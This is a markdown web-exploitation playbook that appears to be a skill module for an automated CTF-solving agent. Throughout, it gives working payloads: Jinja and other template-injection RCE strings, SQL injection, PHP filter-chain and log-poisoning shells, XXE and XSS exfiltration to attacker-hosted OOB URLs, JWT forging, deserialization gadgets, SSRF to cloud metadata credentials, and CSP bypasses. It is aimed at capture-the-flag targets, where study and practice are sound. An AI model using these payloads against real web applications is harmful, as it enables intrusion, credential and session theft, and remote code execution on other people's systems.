# Skill Module: web (web exploitation)

Fingerprint the framework, learn its **safe default idiom** (auth decorator, ORM parametrization, autoescape, signed session), then find the ONE handler that opts out. The bug is the outlier against its neighbors — diff, don't CVE-grep. Everything below is web-specific tactics + the tools to run them; base.md owns the solve loop, submission/POISON, belief≠proof, local→remote/PoW, and the `notes/` model.

## Source-first when source ships
Read top-down before touching the network — beats blind fuzzing here.
1. **Stack** from manifests: `requirements.txt`/`Pipfile`, `package.json`, `composer.json`, `Gemfile`, `go.mod`, framework imports, pinned versions (record in `notes/ANALYSIS.md` — version decides which gadget/escape works).
2. **Routes → handlers**, then read each handler for its sink.
3. **Establish the norm**: how do the *other* handlers auth/query/render/deserialize? The vuln handler differs by one line.
4. Trace user input → sink (dataflow), not names.

```bash
# routes
grep -rnE "@(app|bp)\.route|app\.(get|post|put|use)|router\.|path\(|Route::|(get|post) '|@(Get|Post)Mapping" .
# dangerous sinks
grep -rnE "eval\(|exec\(|os\.(system|popen)|subprocess|child_process|shell_exec|passthru|proc_open|Runtime|render_template_string|Template\(|ERB|pickle\.|yaml\.(load|unsafe)|unserialize|Marshal\.load|Psych\.load|\.raw\(|\.extra\(|\.execute\(|send_file|sendFile|readfile|include|require_once|createObjectURL|dangerouslySetInnerHTML" .
```
No source? Map the app first: capture one normal request/response per feature, then grep JS bundles for hidden routes (`grep -oE '"/api/[^"]+"'`, `.map` sourcemaps), diff what the UI sends vs. what the API accepts (optional JSON fields unlock paths).

## Deviation table by stack — SAFE idiom → SMELL → probe
### Flask / Python
| Class | Safe | Smell / probe |
|---|---|---|
| SSTI | `render_template("x.html", v=v)` | `render_template_string`, f-string/`%`/`.format` INTO template → Jinja. Probe `{{7*7}}`→49, `{{7*'7'}}`→`7777777` |
| SQLi | ORM / `execute("...=%s",(v,))` | f-string/`%`/`+` into `.execute(f"...{v}")` |
| Deserialize | — | `pickle.loads`, `yaml.load` w/o `SafeLoader` (safe by default only in PyYAML ≥5.1), `jsonpickle` on user data → RCE |
| Cmd | arg-list `subprocess.run([...])` | `os.system`, `shell=True`, `os.popen` w/ input |
| Auth | `@login_required` on every private view | the one view missing it → IDOR |
| `str.format` | — | user string into `"...".format(obj)` → `{0.__class__...}` attr traversal (leak, no engine) |
| Debug/secret | — | `debug=True` (Werkzeug console PIN → RCE, `/console`), hardcoded/weak `SECRET_KEY` → forge cookie w/ `flask-unsign`, `@csrf.exempt` |
| Path | — | `open`/`send_file`/`os.path.join(base,user)` w/ `../` (note: `join('/a',​'/etc/passwd')` == `/etc/passwd`) |

### Django
- **IDOR**: safe = `get_object_or_404(qs.filter(user=request.user))`; smell = fetch by raw pk, no owner filter. Also `@login_required`, `PermissionRequiredMixin`.
- **SQLi**: ORM safe; smell `.raw(...)`, `.extra(...)`, `cursor().execute(f"...")`.
- **XSS**: autoescape on; smell `|safe`, `mark_safe(...)`, `format_html` w/ user data.
- **Secret**: leaked/guessable `SECRET_KEY` → forge signed cookies/tokens; `DEBUG=True` leaks settings+stacktrace; `@csrf_exempt`.

### Node / Express
- **Auth**: route mounted without the `requireAuth` middleware.
- **Injection**: template-literal SQL vs `?`; `child_process.exec(input)` vs `execFile([args])`.
- **Deserialize/eval**: `node-serialize.unserialize` (`_$$ND_FUNC$$_` IIFE payload), `vm.runInThisContext`, `eval`, `Function(input)`.
- **Prototype pollution**: recursive `merge`/`extend`/`_.defaultsDeep`/`Object.assign`/`set(obj,path,v)` from parsed JSON. Probe `{"__proto__":{"polluted":"x"}}`; gadget → authz bypass (`isAdmin`) / RCE (child_process `shell`,`NODE_OPTIONS`, EJS/pug template opts). Try `__proto__` on JSON endpoints even when the bug looks like something else.
- **JWT**: `alg:none` accepted, HS256 weak secret, or `jwt.decode` used instead of `jwt.verify` (no sig check). RS256→HS256 confusion if pubkey known — see recipe.
- **SSRF/path**: `sendFile(req.query.f)`, server `fetch/axios(userUrl)` no allowlist.
- **VM sandbox escape**: `this.constructor.constructor("return process")().mainModule.require('child_process')`.

### PHP
- **Deserialize**: `unserialize($_GET/$_POST)` → POP chain via `__wakeup`/`__destruct`; hunt gadget classes in scope (`phpggc` for known libs).
- **Injection**: concat SQL vs PDO/mysqli `?`; `system`/`exec`/`shell_exec`/`passthru`/backticks/`popen`.
- **Code/file**: `eval`/`assert`("...$in...")/`create_function`/`preg_replace('/e')`; `include`/`require` w/ user path → LFI/RFI (see wrapper recipe).
- **Upload**: weak ext/MIME check → `.php` shell; `.htaccess`/double-ext/`.phtml`/`.phar` tricks.
- **Type juggling**: `==` on hashes (`0e…` magic hashes collide), loose compares — see recipe.

### Ruby / Rails
- **Mass assignment**: missing `permit`/strong params → inject `admin=true`.
- **Deserialize**: `Marshal.load`, `YAML.load`/`Psych.load` on user data.
- **Injection**: interpolated SQL vs `where("x = ?",v)`; `system`, backticks, `%x[]`, `Kernel.open("|cmd")`.
- **SSTI**: `render inline:`, `ERB.new(user).result`; `instance_eval` (break with `');code#`).
- **Secret**: leaked `secret_key_base` → forge/decrypt `_session` (old Rails: Marshal cookie → RCE).

### Go
- **SSTI**: `text/template`/pongo2 with user template → `{{.ReadFile "/flag"}}`, pongo2 `{% include "/flag" %}` + path-traversal template name.
- **SSRF/Host**: `http.Get("http://"+r.Host+"/...")` → Host header controls target.
- **Parser mismatch**: proxy vs `net/http` normalize paths differently → 403 bypass.

### Cross-stack always-check
IDOR (increment/swap IDs & UUIDs; try all-zero `00000000-…`/default admin id) · SSRF (`http://127.0.0.1`, `169.254.169.254` metadata, `file://`, `gopher://`) · path traversal (`../../etc/passwd`, `%2e%2e%2f`, double-encode, null byte on legacy) · JWT/session (decode, `alg:none`, crack HS256, tamper) · CORS / open redirect / Host-header if flag is auth/origin-gated · **parser disagreement** (proxy vs app, URL-parser vs fetcher, sanitizer vs browser, serializer vs filter — the classic CTF web bug).

## Recon & OOB
Script requests in `solver.py`, don't drive a GUI proxy.
```bash
curl -sSi https://TARGET/ | sed -n '1,25p'           # headers, cookies, server, framework tells
curl -sS https://TARGET/robots.txt https://TARGET/sitemap.xml https://TARGET/.well-known/
ffuf -u https://TARGET/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,301,302,403 -t 40
ffuf -u 'https://TARGET/item?FUZZ=1' -w params.txt -fs 0     # param discovery via size filter
```
Reach for: **ffuf/feroxbuster/katana** (dir+param+crawl), **nuclei** (banner→CVE templates), **httpx** (fingerprint), **git-dumper** (`.git`), **PayloadsAllTheThings** (payload bank). Reusable client:
```python
import httpx
c = httpx.Client(base_url="https://TARGET", timeout=10, follow_redirects=True)
r = c.post("/login", data={"user":"a","password":"a"}); print(r.status_code, dict(r.cookies))
```

### Recon wins — the flag may already be exposed
| Find | Move |
|---|---|
| Exposed `.git`/`.svn`/`.hg` | `git-dumper`, then `git log -p --all -S password`/`-S flag`; inspect reverted commits & stashes |
| Editor backups | `index.php~`, `.php.swp`/`.swo`, `.bak`, `config.php.save`, `.DS_Store` → source/secrets leak |
| Custom headers | `curl -sSI` for `x-flag`/`x-secret`; `server`/`x-powered-by` banner → CVE match (nuclei) |
| Robots/sitemap/bundled JS | hidden routes, admin paths, hardcoded API keys/endpoints, client-side secrets/HMAC keys |
| 404 assets, source maps | `strings favicon.ico \| grep -i flag`; `.map` files reconstruct client source |
| Paywall/hidden overlay | content is in raw HTML — `curl`/view-source bypasses the CSS overlay |

### OOB callback for blind bugs — give the target a URL, poll the hit
No reflection ≠ no bug. Start `interactsh-client` (or webhook.site) → unique URL; inject it; poll. A **DNS** hit proves egress even when HTTP is filtered. To host a full exploit page the target/bot must reach, expose it with `cloudflared tunnel --url http://localhost:PORT` (fewer interstitials than ngrok).
| Blind bug | Injection carrier |
|---|---|
| Blind SSRF | any URL/host field, webhook config, PDF/HTML/image renderer, `url=`/`callback=` param |
| Blind XXE | `<!DOCTYPE r [<!ENTITY x SYSTEM "http://OOB/">]>&x;`; param-entity + external DTD to exfil a file in the hostname/path |
| Blind XSS / admin bot | store `"><script src=//OOB></script>` where a bot/admin renders it → capture `document.cookie`/token/DOM, then have it hit the flag page |

## Confirm the primitive against the live target (before escalating)
Reflect a marker / trigger one observable, then escalate. Cache the working request as a function in `solver.py`.
| Primitive | Cheap confirm |
|---|---|
| SSTI | probe table below; `49`/`7777777` reflects → RCE recipe |
| SQLi | boolean (`' AND 1=1`/`1=2`), `ORDER BY n` error, time `SLEEP(5)`/`pg_sleep(5)` before `UNION` |
| SSRF | point at an OOB listener or `file:///etc/hostname` and read the echo |
| Proto-pollution | probe payload, then read back a property you polluted before weaponizing |
| Deserialize | benign gadget causing an observable (sleep/DNS) before the RCE gadget |
| Path/LFI | `/etc/passwd` or `php://filter` base64 of a known file first |
| XSS/bot | fire a marker `img.src=//OOB` before the real exfil — confirms your JS runs in the bot |

## Weaponization recipes (primitive → flag)

### SSTI — engine probe → RCE (or `SSTImap` to auto-detect)
| Payload → output | Engine → RCE |
|---|---|
| `{{7*7}}`→`49`, `{{7*'7'}}`→`7777777` | **Jinja2** (Python) |
| `{{7*7}}`→`49`, `{{7*'7'}}`→`49` | **Twig** (PHP): `{{['id']\|map('system')\|join}}` |
| `${7*7}`→`49` | **Mako** `${__import__('os').popen('id').read()}` / **FreeMarker** / **Spring EL** |
| `#{7*7}`→`49` | Ruby / Thymeleaf (`*{}`) |
| `<%= 7*7 %>`→`49` | **ERB** (Ruby) `<%=\`cat /flag\`%>` |

```python
assert "49" in c.post("/greet", data={"name":"{{7*7}}"}).text     # confirm engine first
p = "{{cycler.__init__.__globals__.os.popen('cat /flag').read()}}"  # Jinja
print(c.post("/greet", data={"name":p}).text)
```
- **Jinja sandboxed** (`__globals__`/`__subclasses__` blocked): pivot via `|attr`, `request.application.__globals__`, config/namespace gadgets; quote-blocked → `__dict__.update(k=v)` (kwargs need no quotes).
- **FreeMarker**: `<#assign x="freemarker.template.utility.Execute"?new()>${x("id")}`.
- **Distroless / no-shell** (Thymeleaf, Spring): don't spawn `sh` — read the file: `${T(org.springframework.util.FileCopyUtils).copyToByteArray(new java.io.File('/flag'))}` or `${T(java.nio.file.Files).readString(T(java.nio.file.Path).of('/flag'))}`.
- **Go/pongo2**: `{{.ReadFile "/flag"}}`; `{% include "/flag" %}`.

### SQLi — UNION flag pull (after col count confirmed)
```python
q = "0 UNION SELECT 1,flag,3 FROM flags-- -"       # column count from ORDER BY n
print(c.get("/item", params={"id": q}).text)
```
Blind → boolean/time oracle char-by-char, or hand the confirmed injectable param + request template to **`sqlmap`** (`--batch`, `--tamper=` scripts for WAF). WAF/filter bypass: `sELecT`/`selselectect` (nested keyword after single-pass strip), `/**/` comments, hex `0x...` for strings, XML/URL entity encoding, MySQL `@v:=` dual-value. SQLite schema: `UNION SELECT sql,2,3 FROM sqlite_master`.

### NoSQL / GraphQL
- **Mongo**: `{"user":{"$ne":null},"pass":{"$ne":null}}` auth bypass; `$where`/regex blind oracle (break `/re/i` with `a^/)||(<cond>)&&(/a^`); `$regex` char-by-char.
- **GraphQL**: introspection (`{__schema{types{name fields{name}}}}`) to map hidden queries; batching/aliasing to brute; GET requests bypass CORS preflight (useful from an XSS-bot). Interpolated args → SQLi.

### LFI / PHP wrappers → source → RCE
1. **Read source** (find the real bug): `php://filter/convert.base64-encode/resource=index.php` → base64-decode.
2. **Filter chain → RCE** (no writable file): `php_filter_chain_generator.py --chain '<?=system($_GET[0]);?>'` emits a `php://filter/...|...` string that an `include` materializes into live PHP.
3. **LFI → RCE** when chains blocked: log poisoning (`/var/log/apache2/access.log` w/ UA `<?php system($_GET[c]);?>`), PHP session (`/tmp/sess_<PHPSESSID>`), `.htaccess` `auto_prepend_file`, `/proc/self/environ`, `data://text/plain;base64,...`, `phar://` (triggers deser via metadata), `expect://`, null-byte on PHP<5.3.4.
4. **Traversal filter bypass**: `....//`, `..%2f`, `%252e%252e%252f` (double-enc), `{.}{.}/`, `/dev/fd/../environ` when `/proc` blocked, Windows 8.3 `FILEFO~1.EXT`.
5. **Type juggling** (auth/compare bypass): `==` on `0e…` magic hashes collide (`md5('240610708')`=`0e462…`); `strcmp($_GET[a],$s)` with `?a[]=1` returns `NULL`==0 → true; `password[]=x` breaks `password_verify`; JSON `{"pw":0}` == `"0e…"`; send JSON int `0` for a string password check.

### XXE — file read / SSRF / OOB exfil
```xml
<?xml version="1.0"?>
<!DOCTYPE r [<!ENTITY x SYSTEM "php://filter/convert.base64-encode/resource=/flag">]>
<root>&x;</root>
```
Blocked entities / no reflection → **external DTD**: host `<!ENTITY % f SYSTEM "file:///flag"><!ENTITY % e "<!ENTITY s SYSTEM 'http://OOB/?%f;'>">%e;%s;` and reference it. Carriers: DOCX/XLSX (ZIP+XML — inject in `[Content_Types].xml`), SVG, SAML, any XML/RSS upload. Also `X-Forwarded-For`/header reflected into XML → `</ip><admin>true</admin>` injection.

### Command injection — separators & filter bypass
```bash
; id    | id    `id`    $(id)    %0aid    &&id    a||id
```
Space-blocked → `{cat,/flag}` (brace) or `cat${IFS}/flag`. `cat`/`head` blocked → `sed -n p flag`, `tac flag`, `awk '{print}'`, `nl flag`. Char-limited PHP → backticks `` `$_GET[0]`; `` move payload to URL. Filter only strips `;|&<>` → newline `%0a`. LaTeX PDF gen → `\input{|"cat /flag"}`, `\@@input"/etc/passwd"`.

### JWT & signed-session forgery
Tools: `jwt_tool -M at` (probes all below), `hashcat -m 16500` (crack HS256), `flask-unsign` (Flask cookies).
| Weakness | Forge |
|---|---|
| `alg:none` accepted | header `{"alg":"none"}`, drop signature, set `admin`/`user` claim |
| Weak HS256 secret | `hashcat -m 16500 jwt.txt rockyou.txt` → re-sign with cracked key |
| RS256→HS256 confusion | server verifies HS256 using the **public key** as the HMAC secret → sign token with the pubkey bytes as key |
| `jku`/`x5u` header | point to a JWKS URL you host (OOB) → server fetches your signing key |
| `kid` injection | SQLi / path traversal in `kid`; `kid`→`../../../dev/null` = empty key → HMAC with `""` |
| unverified sig | `jwt.decode` w/o verify → just edit the payload, keep old signature |
| key exposure | check `/api/getPublicKey`, `.env`, `/debug/config` |

```bash
flask-unsign --unsign --cookie "$COOKIE" --wordlist rockyou.txt   # recover Flask SECRET_KEY
flask-unsign --sign --cookie "{'user':'admin','admin':True}" --secret 'FOUND'
```

### Deserialization — identify by magic, then gadget
| Stack | Magic / tell | Weaponize |
|---|---|---|
| Java | base64 `rO0AB…` / bytes `AC ED 00 05` | `ysoserial CommonsCollections5 'cmd'`; blind → `URLDNS` to OOB first to confirm the sink |
| Python | `pickle.loads`; cookie starts `gAS…`/`\x80` | class with `__reduce__` → `return (os.system,('cat /flag',))`; `pickletools.dis` to read incoming |
| PHP | `unserialize`; `O:`/`a:` string | POP chain via `__wakeup`/`__destruct`; `phpggc <lib> <gadget> system id` |
| .NET | `TypeNameHandling.All` (Json.NET) / `BinaryFormatter` | `ysoserial.net -g ObjectDataProvider -f Json.Net -c 'cmd'` |
| Ruby | `Marshal.load`; `\x04\x08` | universal Marshal RCE gadget (Ruby ≤3.x) |
| Werkzeug/itsdangerous | signed `session` cookie | once `SECRET_KEY` leaks → `flask-unsign --sign`; re-sign `SecureCookie` |

### File upload → RCE / read
Bypass ext/MIME: double-ext `shell.png.php`, `.phtml`/`.phar`, `.htaccess` (`AddType application/x-httpd-php .lol`), null-byte, MIME spoof + magic bytes (PNG/PHP polyglot: `<?php` after `IEND`). ZIP upload with `.php` inside → extract to web dir. `disable_functions` on → `scandir('/')`+`file_get_contents('/flag')`. Python arbitrary write → drop `.so`/overwrite `.pyc` for import RCE. Symlink-in-zip (ZipSlip) → read/write outside dir.

### Race / TOCTOU
Double-spend, coupon/gift-card reuse, one-time token replay, balance underflow, registration collision: fire **20–50 identical requests in parallel** to beat the check→use window.
```python
import asyncio, httpx
async def hit(c): return (await c.post("/redeem", data={"code":"X"})).status_code
async def main():
    async with httpx.AsyncClient(base_url="https://TARGET") as c:
        print(await asyncio.gather(*[hit(c) for _ in range(40)]))
asyncio.run(main())
```
Tighter timing → Turbo Intruder or the HTTP/2 single-packet attack (all requests in one frame).

### SSRF bypass ladder (allowlist / regex defeats)
| Rung | Payload |
|---|---|
| Unescaped `.` in regex | filter `allowed\.com` also matches `allowedXcom.attacker.com` |
| Credential/`@` confusion | `http://allowed@127.0.0.1/`, `http://127.0.0.1@allowed/`, `http://x@allowed@127.0.0.1/` (parser vs curl disagree) |
| Alt IP encodings | `http://0x7f000001/`, `http://2130706433/`, `http://127.1/`, `http://[::1]/`, `http://[::ffff:127.0.0.1]/`, `127.0.0.1.nip.io` |
| Redirect | your server returns 302→`http://127.0.0.1/` (allowlist checks only the first URL) |
| DNS rebinding | TOCTOU between validation and fetch (rebinder.html) |
| Scheme pivot | `gopher://127.0.0.1:6379/_<raw redis>`, `gopher://…/mysql`, `file:///flag`, `dict://`, `http://127.0.0.1:2375/` (Docker API → `/exec` RCE) |
| Cloud metadata | AWS `http://169.254.169.254/latest/meta-data/iam/security-credentials/`; GCP `http://metadata.google.internal/…` (`Metadata-Flavor: Google`) |

### Access-control / 403 bypass
- **Path confusion** (proxy vs app normalize differently): `%2f`/`%2e%2e`, `/admin/..;/`, trailing `/`, `..;/`, `.json`/`.css` suffix, case, double slash.
- **Header spoof**: `Host: 127.0.0.1`, `X-Forwarded-For: 127.0.0.1`, `X-Original-URL: /admin`, `X-Forwarded-Host`, `X-Rewrite-URL`.
- **Method swap**: try `TRACE`/`PUT`/`PATCH`/`HEAD`/arbitrary verb on a `403`d route.
- **Source grep**: the one endpoint missing `@login_required`/`requireAuth`; all-zero/nil UUIDs or default admin id; predictable/sequential IDOR keys; a `/admin/login` that seeds a reusable admin cookie.

## Client-side (XSS, admin bot, CSP) — flag lives in the bot's session
**Bot model**: a report endpoint makes a headless (Puppeteer/Playwright) admin visit your URL *with the flag/cookie in its context*. Your job: run JS in that context (or leak scriptlessly) and exfil. Give the bot a URL you host (via cloudflared) or a stored-XSS injection. Solve any report-endpoint PoW. Reproduce the bot locally with `playwright`/`puppeteer` chromium; fuzz reflected/DOM sinks with `dalfox`.

### Get JS to run
| Vector | Payload |
|---|---|
| Reflected/stored HTML sink | `<img src=x onerror=P>`, `<svg onload=P>`, `<script>P</script>`, `<body onload=P>` |
| `new URL()` validates syntax not scheme | `javascript:P` (also `data:`,`blob:`) — runs in bot's navigation context, target CSP/SRI irrelevant |
| jQuery `$(location.hash)`/`$(userinput)` | `#<img src=x onerror=P>` (iframe `onload` to trigger `hashchange`) |
| Content-Type from extension | upload/route `note.html` served `text/html` → HTML executes |
| DOM clobbering (no JS filter) | `<form id=config><input name=isAdmin value=1>` clobbers `window.config.isAdmin` |
| Client-side path traversal (CSPT) | frontend `fetch("/log/"+id)` → `id=../admin/addAdmin` |

Filter bypass: case-mix `<ScRiPt>`, `<svg/onload=>`, template literal ``alert`1` ``, HTML entities `&#40;`, hex `\x3c`, **Unicode case-fold** `<ſcript>` (U+017F→s; also `ı`→i, `K`U+212A→k) when regex is ASCII but downstream folds, decimal-IP + `document["cookie"]` bracket notation when dots are filtered.

### Exfil channel (pick by CSP)
1. `fetch`/XHR to your host — blocked by `connect-src`/`default-src`.
2. `new Image().src='//OOB/?'+data` / `location=` / `<link rel=prefetch>` / `<meta http-equiv=refresh>` — governed by `img-src`/`prefetch-src`/navigation, so they leak when only `script-src`/`connect-src` is set.
3. **DNS**: `new Image().src='http://'+btoa(flag)+'.OOB'` — the subdomain carries the data; survives even a restrictive `img-src` host if the DNS lookup itself fires.
4. **Self-upload / same-origin store**: fetch `/admin`, POST result back as a filename/note → read it yourself. Beats all egress filtering.

### CSP bypass ladder
| CSP weakness | Bypass |
|---|---|
| missing `base-uri` + nonced relative `<script src=rel.js>` | inject `<base href=//attacker/>` — nonce still valid, src now yours |
| whitelists a CDN (`cdnjs`, `unpkg`) | load **Alpine/htmx/hyperscript/AngularJS** from it → behavioral attrs `x-init`/`hx-get`/`_=`/`{{}}` run code sanitizers don't strip |
| whitelists shared cloud (`*.run.app`,`*.cloudfunctions.net`) | host your JS there |
| JSONP/`?callback=` endpoint on an allowed origin | XSSI: `<script src="/x.js?callback=leak">` wraps secret in your fn |
| attacker-controlled MIME on same-origin reflect | `<script src="/reflect?...&type=application/javascript">` (nosniff doesn't override a declared type) |
| `script-src` only, no `object`/`prefetch` limits | scriptless exfil via `<link rel=prefetch>`, `<meta refresh>` |
| inline blocked but bot follows redirects | HTML-inject `<meta http-equiv=refresh url=//attacker/x.html>` → run JS freely off-origin |

### Scriptless / CSS-only (strict CSP, `style-src` open)
- `@font-face`+`unicode-range` per char → font fetch fires only for present chars (leaks char *set*).
- Custom-font glyph widths + `@container` queries → per-char width oracle (leaks order too).
- `input[value^=a]{background:url(//OOB/a)}` attribute-value exfil.

### Read what's already there
- Hidden DOM: `[...document.querySelectorAll('*')].filter(e=>getComputedStyle(e).display=='none'&&e.textContent.trim())`.
- React state (never in HTML): find `__reactFiber$`/`__reactInternalInstance$` key on a node, walk `.return` to `stateNode.memoizedState`.
- Closed shadow DOM: `Element.prototype.attachShadow` Proxy to capture root; `(0,eval)` to escape `with()` scope.
- Client HMAC/signing key hardcoded in JS → deobfuscate, call the leaked `sign()` in console to forge requests.

### Cache poisoning
Unkeyed header (`X-Forwarded-Host`, `X-Original-URL`) reflected into HTML + a cache that keys on URL only → one poisoned request serves your payload to every visitor incl. the bot. Registering a username/path ending `.js`/`.css`/`.svg` can flip a per-user page into a CDN-cached static asset → self-XSS becomes wormable stored XSS.

### Cross-origin plumbing
Shared parent domain → set `domain=.site.tld` cookie from a sibling subdomain that reflects it → XSS on the target. `postMessage` handler that accepts `null`/empty origin → send from a `data:` or `sandbox`-only iframe. React-controlled inputs ignore `.value=`: use the native setter + dispatch `input`/`change` (for local form driving).

## Version gotchas
- **PyYAML** `yaml.load(x)` is RCE only < 5.1; ≥5.1 needs an explicit unsafe loader.
- **Werkzeug console PIN** algorithm differs pre/post 0.15 and 1.0 (mac, `machine-id`, username); only reachable with `debug=True`.
- **Jinja sandbox** (SandboxedEnvironment) blocks `__globals__`/`__subclasses__` — pivot via `|attr`, `request`, config/namespace gadgets.
- **JWT libs**: many accept `alg:none` only if you pass `algorithms=['none']`; the classic bug is `decode` without `algorithms=` pinned, or trusting the header `alg`.
- **AngularJS <1.6** has a bypassable expression sandbox (`charAt`→`trim` override); 1.6+ removed it entirely.
- **Banner/version → CVE**: match a pinned dep or `Server`/`x-powered-by` string against a public CVE with `nuclei`; e.g. WeasyPrint `<a rel=attachment href=file:///flag>` (CVE-2024-28184), React Server Components Flight RCE (CVE-2025-55182). This is the 1-day path — do it after the deviation hunt, not instead.

## Finding the flag
Flags sit behind the vuln: DB table/row (`flag`,`flags`,`secret`), a file (`/flag`, `/flag.txt`, app root, `/proc/self/environ`), an env var, an admin-only view, or a hidden DOM node / `data-*` attr. After RCE/LFI check `cat /flag*`, `env`, app config, DB. Match `../chal_desc.md`'s flag format before submitting. When a sink is confirmed, record it in `notes/VULN.md` (`sink: <route> param <x> → <class>`, with the measured primitive); park dead ends/POISON in `notes/NEXT.md`. Cross-category pivot: RCE→memory-corruption/seccomp `../../skills/pwn.md`, token math/custom MAC `../../skills/crypto.md`, contract frontend `../../skills/blockchain.md`.

## Web-specific anti-patterns
- Blind fuzzing before reading shipped source; driving a GUI proxy instead of scripting in `solver.py`.
- Chasing a CVE name instead of the codebase's own deviation.
- Escalating on an unproven primitive; jumping to RCE before `{{7*7}}` reflects, or building an XSS chain before a marker `img.src` confirms your JS runs in the bot.
- Declaring a blind bug dead without an OOB callback — no reflection ≠ no vuln.
- Fighting CSP to exfil externally when a same-origin self-upload/store would leak it with zero egress.
